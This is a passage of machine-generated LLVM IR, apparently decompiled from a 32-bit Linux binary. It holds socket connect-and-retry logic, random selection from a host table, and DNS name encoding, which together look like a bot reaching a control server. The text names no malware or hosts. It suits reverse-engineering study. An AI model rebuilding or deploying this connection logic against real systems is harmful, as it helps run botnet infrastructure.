  %v0_804ed10 = load i32, i32* @esp, align 4
  %v1_804ed10 = inttoptr i32 %v0_804ed10 to i32*
  store i32 1, i32* %v1_804ed10, align 4
  %v1_804ed17 = call i32 @function_8054770(i32 0)
  store i32 %v1_804ed17, i32* %eax.global-to-local, align 4
  %v0_804ed1c = load i32, i32* @esp, align 4
  %v1_804ed1c = add i32 %v0_804ed1c, 24
  %v2_804ed1c = inttoptr i32 %v1_804ed1c to i32*
  %v3_804ed1c = load i32, i32* %v2_804ed1c, align 4
  store i32 %v3_804ed1c, i32* @ebx, align 4
  %v1_804ed20 = add i32 %v0_804ed1c, 16
  br label %dec_label_pc_804e820

dec_label_pc_804ed28:                             ; preds = %dec_label_pc_804ebd4
  %v1_804ed28 = add i32 %v0_804ed28, 1
  %v2_804ed29 = load i32, i32* %v1_804ed29, align 4
  %v14_804ed29 = icmp eq i32 %v2_804ed29, %v1_804ed28
  br i1 %v14_804ed29, label %dec_label_pc_804ec9a, label %dec_label_pc_804ebe6

dec_label_pc_804ed38:                             ; preds = %dec_label_pc_804ec08
  %v1_804ed38 = add i32 %v0_804ed38, 1
  %v2_804ed39 = load i32, i32* %v1_804ed39, align 4
  %v14_804ed39 = icmp eq i32 %v2_804ed39, %v1_804ed38
  br i1 %v14_804ed39, label %dec_label_pc_804ec9a, label %dec_label_pc_804ec1a

dec_label_pc_804ed48:                             ; preds = %dec_label_pc_804ec40
  %v1_804ed48 = add i32 %v0_804ed48, 1
  %v2_804ed49 = load i32, i32* %v1_804ed49, align 4
  %v14_804ed49 = icmp eq i32 %v2_804ed49, %v1_804ed48
  br i1 %v14_804ed49, label %dec_label_pc_804ec9a, label %dec_label_pc_804ec52

dec_label_pc_804ed58:                             ; preds = %dec_label_pc_804ec7a
  %v1_804ed58 = add i32 %v0_804ed58130, 1
  %v12_804ed59 = icmp eq i32 %v3_804ec58, %v1_804ed58
  br i1 %v12_804ed59, label %dec_label_pc_804ec9a, label %dec_label_pc_804ec70.backedge

dec_label_pc_804ec70.backedge:                    ; preds = %dec_label_pc_804ed58, %dec_label_pc_804ec89
  %v3_804ec8093 = phi i32 [ 0, %dec_label_pc_804ec89 ], [ %v1_804ed58, %dec_label_pc_804ed58 ]
  %storemerge33.in = add i32 %v0_804ed61131, 1
  %v1_804ec70 = add i32 %v1_804ec70133, -1
  store i32 %v1_804ec70, i32* @ebx, align 4
  %v10_804ec71 = icmp eq i32 %v1_804ec70133, 0
  br i1 %v10_804ec71, label %dec_label_pc_804eb5c, label %dec_label_pc_804ec7a

dec_label_pc_804ed67:                             ; preds = %dec_label_pc_804eb5c
  %v2_804ed6a = inttoptr i32 %v0_804eb71 to i32*
  store i32 12, i32* %v2_804ed6a, align 4
  %v2_804ed6c = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ed6c, i32* %eax.global-to-local, align 4
  %v0_804ed71 = load i32, i32* @esp, align 4
  %v1_804ed71 = inttoptr i32 %v0_804ed71 to i32*
  store i32 13, i32* %v1_804ed71, align 4
  %v2_804ed78 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ed78, i32* %eax.global-to-local, align 4
  %v0_804ed7d = load i32, i32* @esp, align 4
  %v1_804ed7d = inttoptr i32 %v0_804ed7d to i32*
  store i32 14, i32* %v1_804ed7d, align 4
  %v2_804ed84 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ed84, i32* %eax.global-to-local, align 4
  %v0_804ed89 = load i32, i32* @esp, align 4
  %v1_804ed89 = inttoptr i32 %v0_804ed89 to i32*
  store i32 15, i32* %v1_804ed89, align 4
  %v2_804ed90 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ed90, i32* %eax.global-to-local, align 4
  %v0_804ed95 = load i32, i32* @esp, align 4
  %v1_804ed95 = inttoptr i32 %v0_804ed95 to i32*
  store i32 16, i32* %v1_804ed95, align 4
  %v2_804ed9c = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ed9c, i32* %eax.global-to-local, align 4
  %v0_804eda1 = load i32, i32* @esp, align 4
  %v1_804eda1 = inttoptr i32 %v0_804eda1 to i32*
  %v2_804eda1 = load i32, i32* %v1_804eda1, align 4
  store i32 %v2_804eda1, i32* %eax.global-to-local, align 4
  %v1_804eda2 = add i32 %v0_804eda1, 56
  %v2_804eda2 = inttoptr i32 %v1_804eda2 to i32*
  %v3_804eda2 = load i32, i32* %v2_804eda2, align 4
  store i32 %v3_804eda2, i32* @edi, align 4
  store i32 %v3_804eda2, i32* %v1_804eda1, align 4
  %v1_804eda7 = call i32 @function_8052bc1(i32 0)
  store i32 %v1_804eda7, i32* @eax, align 4
  %v0_804edac = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecec

; uselistorder directives
  uselistorder i32 %v1_804ec70, { 1, 0 }
  uselistorder i32 %v6_804ec7e, { 2, 0, 1 }
  uselistorder i32 %v0_804ed61131, { 1, 0 }
  uselistorder i32 %v2_804ec5f, { 1, 0 }
  uselistorder i32 %v3_804ec58, { 1, 0, 2 }
  uselistorder i32 %v0_804eb5c54, { 2, 1, 0 }
  uselistorder i32 %v0_804ec67, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804ec44, { 0, 2, 1 }
  uselistorder i32 %v0_804ed48, { 1, 0 }
  uselistorder i32 %v0_804ec33, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804ec2a, { 1, 0 }
  uselistorder i32 %v1_804ec2a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804ec2a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804ec20, { 1, 0 }
  uselistorder i32 %v6_804ec0c, { 1, 0 }
  uselistorder i32 %v0_804ed38, { 1, 0 }
  uselistorder i32 %v0_804ebff, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804ebf6, { 1, 0 }
  uselistorder i32 %v0_804ebf6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804ebec, { 1, 0 }
  uselistorder i32 %v6_804ebd8, { 1, 0 }
  uselistorder i32 %v0_804ed28, { 1, 0 }
  uselistorder i32 %v0_804ebcb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804ebc2, { 1, 0 }
  uselistorder i32 %v0_804ebc2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804ebb8, { 1, 0 }
  uselistorder i32 %v6_804eba4, { 1, 0 }
  uselistorder i32 %v0_804ec90, { 1, 0 }
  uselistorder i32 %v0_804eb91, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804eb88, { 1, 0 }
  uselistorder i32 %v0_804eb88, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804eb5c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804ea97, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ea74, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804ea6f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ea0a, { 1, 0 }
  uselistorder i32 %v0_804ea01, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e9fc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ea0a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e9e3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804e9aa, { 0, 2, 1 }
  uselistorder i32 %v4_804e965, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e90a, { 2, 1, 0 }
  uselistorder i32 %v0_804e8c4, { 1, 0, 2 }
  uselistorder i32 %v1_804e871, { 1, 0 }
  uselistorder i32 %v1_804e86e, { 2, 1, 0 }
  uselistorder i32 %v0_804e86e, { 1, 0, 2 }
  uselistorder i32 %v2_804e86c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e888, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e83d, { 1, 0 }
  uselistorder i32 %v1_804e83a, { 1, 0, 2 }
  uselistorder i32 %v0_804e82d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e828, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804e820, { 1, 0 }
  uselistorder i32 %v3_804e762, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804e720, { 1, 0, 2 }
  uselistorder i32 %v2_804e70c, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804e6cf, { 0, 2, 1 }
  uselistorder i32 %v3_804e691, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804e644, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804e5f7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804e5a3, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 140, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8052f14, { 2, 1, 0 }
  uselistorder i32 ()* @function_8052990, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8052910, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 19, 20, 21, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8053075, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_8052f84, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8052640, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ecec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ec9a, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec7a, { 1, 0 }
  uselistorder label %dec_label_pc_804ec58, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ec40, { 1, 0 }
  uselistorder label %dec_label_pc_804ec20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ec08, { 1, 0 }
  uselistorder label %dec_label_pc_804ebec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ebd4, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eba0, { 1, 0 }
  uselistorder label %dec_label_pc_804eb5c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804ea97, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ea08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e9cd, { 1, 0 }
  uselistorder label %dec_label_pc_804e820, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804e7bf, { 1, 0 }
  uselistorder label %dec_label_pc_804e6be, { 1, 0 }
  uselistorder label %dec_label_pc_804e671, { 1, 0 }
  uselistorder label %dec_label_pc_804e624, { 1, 0 }
}

define i32 @function_804edc0() local_unnamed_addr {
dec_label_pc_804edc0:
  store i32 134541072, i32* @global_var_80571d4.24, align 4
  %v0_804edca = load i32, i32* @eax, align 4
  ret i32 %v0_804edca
}

define i32 @function_804edd0() local_unnamed_addr {
dec_label_pc_804edd0:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804ede3 = call i32 @function_80533b5(i32 2, i32 1, i32 0)
  store i32 %v3_804ede3, i32* @global_var_80571cc.25, align 4
  %v10_804edf2 = icmp eq i32 %v3_804ede3, -1
  br i1 %v10_804edf2, label %dec_label_pc_804ee90, label %dec_label_pc_804edfb

dec_label_pc_804edfb:                             ; preds = %dec_label_pc_804edd0
  %v2_804ee00 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804ee0a = call i32 @function_805337a(i32 %v3_804ede3, i32 1, i32 2, i32 %v2_804ee00, i32 4)
  %v0_804ee12 = load i32, i32* @global_var_80571cc.25, align 4
  %v3_804ee1c = call i32 @function_8052afd(i32 %v0_804ee12, i32 3, i32 0)
  %v12_804ee24 = or i32 %v3_804ee1c, 2048
  %v0_804ee28 = load i32, i32* @global_var_80571cc.25, align 4
  %v3_804ee30 = call i32 @function_8052afd(i32 %v0_804ee28, i32 4, i32 %v12_804ee24)
  %v0_804ee3d = load i8, i8* @global_var_80571d8.26, align 8
  %v1_804ee3d = icmp eq i8 %v0_804ee3d, 0
  br i1 %v1_804ee3d, label %dec_label_pc_804ee96, label %dec_label_pc_804ee46

dec_label_pc_804ee46:                             ; preds = %dec_label_pc_804edfb, %dec_label_pc_804ee96
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804ee58 = call i32 @function_80530f9(i32 2)
  %v2_804ee5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804ee58, i32* @ebx, align 4
  %v1_804ee63 = inttoptr i32 %v1_804ee58 to i32*
  store i32 0, i32* %v1_804ee63, align 4
  %v0_804ee6a = load i32, i32* @global_var_80571cc.25, align 4
  %v3_804ee73 = call i32 @function_80531af(i32 %v0_804ee6a, i32 %v2_804ee5d, i32 16)
  %v8_804ee7b = icmp eq i32 %v3_804ee73, -1
  br i1 %v8_804ee7b, label %dec_label_pc_804eea0, label %dec_label_pc_804ee7e

dec_label_pc_804ee7e:                             ; preds = %dec_label_pc_804ee46
  %v0_804ee7e = load i32, i32* @global_var_80571cc.25, align 4
  %v2_804ee88 = call i32 @function_805326b(i32 %v0_804ee7e, i32 1)
  br label %dec_label_pc_804ee90

dec_label_pc_804ee90:                             ; preds = %dec_label_pc_804edd0, %dec_label_pc_804ee7e
  %v0_804ee95 = phi i32 [ -1, %dec_label_pc_804edd0 ], [ %v2_804ee88, %dec_label_pc_804ee7e ]
  ret i32 %v0_804ee95

dec_label_pc_804ee96:                             ; preds = %dec_label_pc_804edfb
  br label %dec_label_pc_804ee46

dec_label_pc_804eea0:                             ; preds = %dec_label_pc_804ee46
  %v0_804eea0 = load i32, i32* @ebx, align 4
  %v1_804eea0 = inttoptr i32 %v0_804eea0 to i32*
  %v2_804eea0 = load i32, i32* %v1_804eea0, align 4
  %v11_804eea0 = icmp eq i32 %v2_804eea0, 99
  br i1 %v11_804eea0, label %dec_label_pc_804eefe, label %dec_label_pc_804eea5

dec_label_pc_804eea5:                             ; preds = %dec_label_pc_804eea0, %dec_label_pc_804eefe
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804eebf = load i32, i32* @global_var_80571cc.25, align 4
  store i32 %v0_804eebf, i32* @esi, align 4
  %v3_804eec6 = call i32 @function_80531da(i32 %v0_804eebf, i32 %v2_804ee5d, i32 16)
  %v1_804eed2 = call i32 @function_8054770(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804eed8 = load i32, i32* @global_var_80571cc.25, align 4
  %v1_804eedf = call i32 @function_8052bc1(i32 %v0_804eed8)
  %v1_804eeeb = call i32 @function_804df70(i32 58811)
  %v0_804eef0 = call i32 @function_804edd0()
  ret i32 %v0_804eef0

dec_label_pc_804eefe:                             ; preds = %dec_label_pc_804eea0
  store i8 0, i8* @global_var_80571d8.26, align 8
  br label %dec_label_pc_804eea5

; uselistorder directives
  uselistorder i32 %v3_804ede3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804df70, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_805326b, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80531af, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_80571d8.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805337a, { 1, 0 }
  uselistorder label %dec_label_pc_804eea5, { 1, 0 }
  uselistorder label %dec_label_pc_804ee90, { 1, 0 }
  uselistorder label %dec_label_pc_804ee46, { 1, 0 }
}

define i32 @function_804ef10() local_unnamed_addr {
dec_label_pc_804ef10:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804ef17 = call i32 @function_8051cd0(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804ef22 = call i32 @function_8051c20(i32 3, i32* null)
  %v4_804ef27 = inttoptr i32 %v4_804ef22 to i8*
  store i8* %v4_804ef27, i8** %stack_var_-28, align 4
  %v3_804ef2a = call i32 @function_804fd10(i8* %v4_804ef27)
  store i32 %v3_804ef2a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804ef38 = call i32 @function_8051c50(i8 3)
  %v2_804ef40 = icmp eq i32 %v3_804ef2a, 0
  br i1 %v2_804ef40, label %dec_label_pc_804ef96, label %dec_label_pc_804ef44

dec_label_pc_804ef44:                             ; preds = %dec_label_pc_804ef10
  %v1_804ef2f = inttoptr i32 %v3_804ef2a to i8*
  %v2_804ef44 = add i32 %v3_804ef2a, 4
  %v3_804ef44 = inttoptr i32 %v2_804ef44 to i32*
  %v4_804ef44 = load i32, i32* %v3_804ef44, align 4
  store i32 %v4_804ef44, i32* @ebx, align 4
  %v0_804ef47 = load i8*, i8** %stack_var_-28, align 4
  %v1_804ef47 = ptrtoint i8* %v0_804ef47 to i32
  %v2_804ef47 = call i32 @function_804fa40(i32 %v1_804ef47)
  %v3_804ef47 = sext i32 %v2_804ef47 to i64
  %v3_804ef51 = load i8, i8* %v1_804ef2f, align 1
  %v8_804ef57 = zext i8 %v3_804ef51 to i64
  %v11_804ef57 = urem i64 %v3_804ef47, %v8_804ef57
  %v12_804ef57 = trunc i64 %v11_804ef57 to i32
  %v0_804ef59 = load i32, i32* @ebx, align 4
  %v2_804ef59 = mul nuw nsw i32 %v12_804ef57, 4
  %v3_804ef59 = add i32 %v2_804ef59, %v0_804ef59
  %v4_804ef59 = inttoptr i32 %v3_804ef59 to i32*
  %v5_804ef59 = load i32, i32* %v4_804ef59, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804ef2a, i32* %tmp10, align 4
  store i32 %v5_804ef59, i32* @global_var_805732c.28, align 4
  %v2_804ef62 = call i32 @function_804fcd0(i32 %v3_804ef2a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804ef6e = call i32 @function_8051cd0(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804ef79 = call i32 @function_8051c20(i32 4, i32* null)
  %v5_804ef79 = inttoptr i32 %v4_804ef79 to i16*
  %v3_804ef7e = load i16, i16* %v5_804ef79, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804ef7e, i16* bitcast (i32* @global_var_805732a.29 to i16*), align 4
  %v3_804ef8e = call i32 @function_8051c50(i8 4)
  %v2_804ef96.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ef96

dec_label_pc_804ef96:                             ; preds = %dec_label_pc_804ef10, %dec_label_pc_804ef44
  %v2_804ef96 = phi i32 [ %tmp4, %dec_label_pc_804ef10 ], [ %v2_804ef96.pre, %dec_label_pc_804ef44 ]
  ret i32 %v2_804ef96

; uselistorder directives
  uselistorder i32 %v3_804ef2a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ef96, { 1, 0 }
}

define i32 @function_804fa40(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fa40:
  %v0_804fa40 = load i32, i32* @global_var_80572a8.30, align 8
  %v0_804fa48 = load i32, i32* @global_var_80572b4.31, align 4
  %v2_804fa4e = mul i32 %v0_804fa40, 2048
  %v2_804fa53 = udiv i32 %v0_804fa48, 524288
  store i32 %v2_804fa53, i32* @ecx, align 4
  %v2_804fa56 = xor i32 %v2_804fa4e, %v0_804fa40
  %v0_804fa58 = load i32, i32* @global_var_80572ac.32, align 4
  store i32 %v0_804fa58, i32* @global_var_80572a8.30, align 8
  %v0_804fa62 = load i32, i32* @global_var_80572b0.33, align 16
  store i32 %v0_804fa62, i32* @global_var_80572ac.32, align 4
  store i32 %v0_804fa48, i32* @global_var_80572b0.33, align 16
  %v2_804fa74 = xor i32 %v2_804fa53, %v0_804fa48
  %v2_804fa76 = udiv i32 %v2_804fa56, 256
  %v2_804fa79 = xor i32 %v2_804fa76, %v2_804fa56
  %v2_804fa7b = xor i32 %v2_804fa79, %v2_804fa74
  store i32 %v2_804fa7b, i32* @global_var_80572b4.31, align 4
  ret i32 %v2_804fa7b

; uselistorder directives
  uselistorder i32 %v2_804fa56, { 1, 0 }
  uselistorder i32 %v2_804fa53, { 1, 0 }
  uselistorder i32 %v0_804fa48, { 1, 2, 0 }
  uselistorder i32 %v0_804fa40, { 1, 0 }
}

define i32 @function_804fcd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fcd0:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804fcd0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fcd8 = icmp eq i32 %arg1, 0
  br i1 %v1_804fcd8, label %dec_label_pc_804fcd0.dec_label_pc_804fd00_crit_edge, label %dec_label_pc_804fcdc

dec_label_pc_804fcd0.dec_label_pc_804fd00_crit_edge: ; preds = %dec_label_pc_804fcd0
  br label %dec_label_pc_804fd00

dec_label_pc_804fcdc:                             ; preds = %dec_label_pc_804fcd0
  %v1_804fcdc = add i32 %arg1, 4
  %v2_804fcdc = inttoptr i32 %v1_804fcdc to i32*
  %v3_804fcdc = load i32, i32* %v2_804fcdc, align 4
  %v1_804fcdf = icmp eq i32 %v3_804fcdc, 0
  br i1 %v1_804fcdf, label %dec_label_pc_804fcef, label %dec_label_pc_804fce3

dec_label_pc_804fce3:                             ; preds = %dec_label_pc_804fcdc
  %v1_804fce7 = call i32 @function_8054319(i32 %v3_804fcdc)
  br label %dec_label_pc_804fcef

dec_label_pc_804fcef:                             ; preds = %dec_label_pc_804fcdc, %dec_label_pc_804fce3
  store i32 %v0_804fcd0, i32* @ebx, align 4
  %v1_804fcf6 = call i32 @function_8054319(i32 %arg1)
  %v2_804fd00.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804fd00

dec_label_pc_804fd00:                             ; preds = %dec_label_pc_804fcd0.dec_label_pc_804fd00_crit_edge, %dec_label_pc_804fcef
  %v2_804fd00 = phi i32 [ %tmp12, %dec_label_pc_804fcd0.dec_label_pc_804fd00_crit_edge ], [ %v2_804fd00.pre, %dec_label_pc_804fcef ]
  store i32 %v0_804fcd0, i32* @ebx, align 4
  ret i32 %v2_804fd00

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fd00, { 1, 0 }
  uselistorder label %dec_label_pc_804fcef, { 1, 0 }
}

define i32 @function_804fd10(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fd10:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804fd1c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fd1c, i32* @ebx, align 4
  %v4_804fd27 = call i32 @function_8053cc8(i64 1, i32 8)
  %v2_804fd30 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804fd30, i32* %eax.global-to-local, align 4
  %tmp103 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804fd3b = load i32, i32* @ebx, align 4
  %v4_804fd3b = inttoptr i32 %v0_804fd3b to i8*
  %v3_804fd3e = call i32 @function_8052620(i8* %v4_804fd3b)
  %v2_804fd43 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804fd43, i32* %ecx.global-to-local, align 4
  store i32 %v2_804fd30, i32* %edi.global-to-local, align 4
  %v1_804fd4e = add i32 %v3_804fd3e, 1
  store i32 %v1_804fd4e, i32* %eax.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804fd4e, 1
  br i1 %tmp104, label %dec_label_pc_804fd7a, label %dec_label_pc_804fd62.lr.ph

dec_label_pc_804fd62.lr.ph:                       ; preds = %dec_label_pc_804fd10
  %v0_804fd62.pre = load i32, i32* @ebx, align 4
  %v4_804fd62.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fd62

dec_label_pc_804fd54:                             ; preds = %dec_label_pc_804fd69
  %v3_804fd54 = inttoptr i32 %v2_804fd54 to i8*
  store i8 %v2_804fd62, i8* %v3_804fd54, align 1
  %v0_804fd56 = load i32, i32* @esi, align 4
  %v1_804fd56 = add i32 %v0_804fd56, 1
  store i32 %v1_804fd56, i32* @esi, align 4
  %v0_804fd57 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fd57 = add i32 %v0_804fd57, 1
  store i32 %v1_804fd57, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fd5a

dec_label_pc_804fd5a:                             ; preds = %dec_label_pc_804fd6d, %dec_label_pc_804fd54
  %v0_804fd5c = phi i32 [ %v1_804fd73, %dec_label_pc_804fd6d ], [ %v1_804fd57, %dec_label_pc_804fd54 ]
  %v0_804fd5a = load i32, i32* @ebx, align 4
  %v1_804fd5a = add i32 %v0_804fd5a, 1
  store i32 %v1_804fd5a, i32* @ebx, align 4
  %v0_804fd5b = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd5b = add i32 %v0_804fd5b, -1
  store i32 %v1_804fd5b, i32* %eax.global-to-local, align 4
  store i32 %v0_804fd5c, i32* %ecx.global-to-local, align 4
  %tmp105 = icmp slt i32 %v1_804fd5b, 1
  br i1 %tmp105, label %dec_label_pc_804fd5e.dec_label_pc_804fd7a_crit_edge, label %dec_label_pc_804fd62

dec_label_pc_804fd62:                             ; preds = %dec_label_pc_804fd62.lr.ph, %dec_label_pc_804fd5a
  %v2_804fd54 = phi i32 [ %v2_804fd43, %dec_label_pc_804fd62.lr.ph ], [ %v0_804fd5c, %dec_label_pc_804fd5a ]
  %v4_804fd62 = phi i32 [ %v4_804fd62.pre, %dec_label_pc_804fd62.lr.ph ], [ %v0_804fd5c, %dec_label_pc_804fd5a ]
  %v0_804fd62 = phi i32 [ %v0_804fd62.pre, %dec_label_pc_804fd62.lr.ph ], [ %v1_804fd5a, %dec_label_pc_804fd5a ]
  %v1_804fd62 = inttoptr i32 %v0_804fd62 to i8*
  %v2_804fd62 = load i8, i8* %v1_804fd62, align 1
  %v3_804fd62 = zext i8 %v2_804fd62 to i32
  %v5_804fd62 = and i32 %v4_804fd62, -256
  %v6_804fd62 = or i32 %v3_804fd62, %v5_804fd62
  store i32 %v6_804fd62, i32* %edx.global-to-local, align 4
  %v10_804fd64 = icmp eq i8 %v2_804fd62, 46
  br i1 %v10_804fd64, label %dec_label_pc_804fd6d, label %dec_label_pc_804fd69

dec_label_pc_804fd69:                             ; preds = %dec_label_pc_804fd62
  %v4_804fd69 = icmp eq i8 %v2_804fd62, 0
  %v1_804fd6b = icmp eq i1 %v4_804fd69, false
  br i1 %v1_804fd6b, label %dec_label_pc_804fd54, label %dec_label_pc_804fd6d

dec_label_pc_804fd6d:                             ; preds = %dec_label_pc_804fd69, %dec_label_pc_804fd62
  %v0_804fd6d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804fd71 = trunc i32 %v0_804fd6d to i8
  %v2_804fd71 = load i32, i32* %edi.global-to-local, align 4
  %v3_804fd71 = inttoptr i32 %v2_804fd71 to i8*
  store i8 %v1_804fd71, i8* %v3_804fd71, align 1
  %v0_804fd73 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fd73 = add i32 %v0_804fd73, 1
  store i32 %v1_804fd73, i32* %edx.global-to-local, align 4
  store i32 %v0_804fd73, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fd5a

